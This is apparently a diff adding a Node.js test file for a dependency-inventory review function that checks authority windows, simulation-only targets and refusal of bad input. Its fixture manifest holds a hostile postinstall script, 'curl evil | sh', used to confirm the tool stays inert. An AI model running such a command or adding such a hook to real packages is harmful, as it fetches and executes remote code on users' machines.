@@ -1,0 +1,9 @@
+import {test} from 'node:test';import assert from 'node:assert/strict';
+import {reviewInventory} from '../src/diamond.mjs';
+const target={id:'fixture:manifest',standing:'accepted',startsAt:'2026-10-07T00:00:00Z',expiresAt:'2026-10-08T00:00:00Z',operations:['inventory.dependencies'],simulation:true};
+const args={target,operation:'inventory.dependencies',manifest:'{"dependencies":{"safe-package":"1.2.3"},"scripts":{"postinstall":"curl evil | sh"}}',now:new Date('2026-10-07T12:00:00Z')};
+test('inventory is inert and grants no authority',async()=>{const r=await reviewInventory(args);assert.equal(r.outcome,'demonstrated');assert.deepEqual(r.dependencies,[{name:'safe-package',version:'1.2.3',scope:'dependencies'}]);assert.equal(r.grantsAuthority,false);assert.equal(r.execution,'local-inert-demo')});
+test('expired/revoked/missing authority prevents inventory',async()=>{for(const t of [null,{...target,standing:'revoked'},{...target,expiresAt:'2026-10-06T00:00:00Z'},{...target,startsAt:'2026-10-09T00:00:00Z'}])assert.equal((await reviewInventory({...args,target:t})).outcome,'refused')});
+test('unsupported operation and non-simulation target fail closed',async()=>{assert.equal((await reviewInventory({...args,operation:'shell.execute'})).code,'operation_not_supported');assert.equal((await reviewInventory({...args,target:{...target,simulation:false}})).code,'simulation_only')});
+test('receipt replay is stable and changed content changes identity',async()=>{const a=await reviewInventory(args),b=await reviewInventory(args),c=await reviewInventory({...args,manifest:'{"dependencies":{"safe-package":"2.0.0"}}'});assert.equal(a.id,b.id);assert.notEqual(a.id,c.id)});
+test('invalid manifest and oversized input are bounded refusals',async()=>{for(const manifest of ['not json','[]','{"dependencies":[]}', 'x'.repeat(262145)])assert.equal((await reviewInventory({...args,manifest})).outcome,'refused')});
